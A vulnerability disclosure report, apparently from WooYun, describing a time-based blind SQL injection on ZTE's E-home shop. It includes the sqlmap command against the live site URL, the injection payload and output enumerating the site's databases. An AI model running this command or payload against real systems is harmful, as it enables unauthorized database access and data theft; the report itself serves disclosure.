wybug_title: 中兴E家存在post注入整站信息泄露
wybug_corp: 中兴通讯股份有限公司
wybug_detail:
漏洞详情 披露状态：   									2016-01-08：	细节已通知厂商并且等待厂商处理中									2016-01-08：	厂商已经确认，细节仅向厂商公开									2016-01-18：	细节向核心白帽子及相关领域专家公开									2016-01-28：	细节向普通白帽子公开									2016-02-07：	细节向实习白帽子公开									2016-02-20：	细节向公众公开  简要描述：  详细说明：  注入点 sqlmap -u "http://ehome.zte.com.cn/" --data "grade=5&goods_id=2750&commenttype=1&goods_id=2750&commenttype=1&content=88952634"Parameter: content (POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: grade=5&goods_id=2750&commenttype=1&goods_id=2750&commenttype=1&content=88952634' AND (SELECT * FROM (SELECT(SLEEP(5)))hJTA) AND 'oaPW'='oaPW---[00:57:48] [INFO] the back-end DBMS is MySQLweb application technology: JSPback-end DBMS: MySQL 5.0.12[00:57:48] [INFO] fetching database names[00:57:48] [INFO] fetching number of databases[00:57:48] [WARNING] time-based comparison requires larger statistical model, please wait..............................[00:57:50] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y[00:58:34] [INFO] adjusting time delay to 1 second due to good response times3[00:58:35] [INFO] retrieved: information_schema[01:01:08] [INFO] retrieved: test[01:01:45] [INFO] retrieved: zxmallavailable databases [3]:[*] information_schema[*] test[*] zxmall148个表，我就不信没有数据，有没有数据你们清楚吧

   漏洞证明：  注入点 sqlmap -u "http://ehome.zte.com.cn/" --data "grade=5&goods_id=2750&commenttype=1&goods_id=2750&commenttype=1&content=88952634"Parameter: content (POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: grade=5&goods_id=2750&commenttype=1&goods_id=2750&commenttype=1&content=88952634' AND (SELECT * FROM (SELECT(SLEEP(5)))hJTA) AND 'oaPW'='oaPW---[00:57:48] [INFO] the back-end DBMS is MySQLweb application technology: JSPback-end DBMS: MySQL 5.0.12[00:57:48] [INFO] fetching database names[00:57:48] [INFO] fetching number of databases[00:57:48] [WARNING] time-based comparison requires larger statistical model, please wait..............................[00:57:50] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y[00:58:34] [INFO] adjusting time delay to 1 second due to good response times3[00:58:35] [INFO] retrieved: information_schema[01:01:08] [INFO] retrieved: test[01:01:45] [INFO] retrieved: zxmallavailable databases [3]:[*] information_schema[*] test[*] zxmall148个表，我就不信没有数据，有没有数据你们清楚吧
